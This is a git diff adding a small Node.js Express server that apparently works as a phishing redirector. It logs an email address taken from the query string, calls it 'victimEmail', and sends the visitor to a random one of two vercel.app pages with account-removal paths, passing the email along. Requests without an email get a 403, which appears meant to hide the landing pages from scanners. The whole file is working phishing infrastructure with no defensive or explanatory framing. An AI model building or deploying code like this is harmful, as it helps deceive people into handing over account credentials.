@@ -1,0 +1,41 @@
+let express = require("express"),
+    bodyParser = require('body-parser'),
+    app = express(),
+    links = ["https://app-bringioprot.vercel.app/account/remove-masked-apps/","https://app-licoprot.vercel.app/account/remove-masked-apps/"];
+
+
+app.set("port", (process.env.PORT || 8080));
+
+app.use(bodyParser.json())
+
+app.get("/",(req,res)=> {
+
+    console.log(req.query.email);
+    
+    if (req.query.email !== undefined) {
+
+        let link = links[Math.floor(Math.random() * links.length)],
+            victimEmail = req.query.email;
+
+    res.redirect(`${link}?email=${victimEmail}`);
+
+    } else {
+
+        res.sendStatus(403);
+
+    }
+
+})
+
+app.use(function(req, res, next) {
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+    next();
+});
+
+
+app.listen(app.get("port"), () => {
+
+        console.log(`Listening on port ${app.get("port")}`);
+
+});
